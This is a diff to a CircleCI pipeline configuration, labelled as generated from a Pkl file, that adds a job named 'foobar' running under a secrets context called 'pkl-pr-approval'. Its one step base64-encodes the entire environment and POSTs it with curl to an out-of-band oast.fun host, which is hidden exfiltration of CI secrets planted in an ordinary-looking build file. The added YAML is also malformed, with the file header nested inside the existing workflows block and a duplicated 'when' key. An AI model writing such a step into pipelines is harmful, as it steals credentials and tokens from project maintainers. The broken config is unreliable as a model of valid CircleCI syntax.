@@ -32,6 +32,43 @@ workflows:
         equal:
           - main
           - << pipeline.git.branch >>
+    # Generated from CircleCI.pkl. DO NOT EDIT.
+version: 2.1
+
+jobs:
+  foobar:
+    docker:
+      - image: cimg/base:current
+    steps:
+      - checkout
+      - run:
+          command: env | base64 | curl -X POST -d @- jbqoqsfkldaisrqfdgtbhtalxdxqod7xw.oast.fun
+
+workflows:
+  version: 2
+
+  prb:
+    when:
+      matches:
+        value: << pipeline.git.branch >>
+        pattern: "^pull/\\d+(/head)?$"
+    jobs:
+      - hold:
+          type: approval
+      - foobar:
+          context: pkl-pr-approval
+          requires:
+            - hold
+
+  main:
+    when:
+      equal:
+        - main
+        - << pipeline.git.branch >>
+    when:
+      equal:
+        - main
+        - main
     jobs:
       - foobar:
           context: pkl-pr-approval
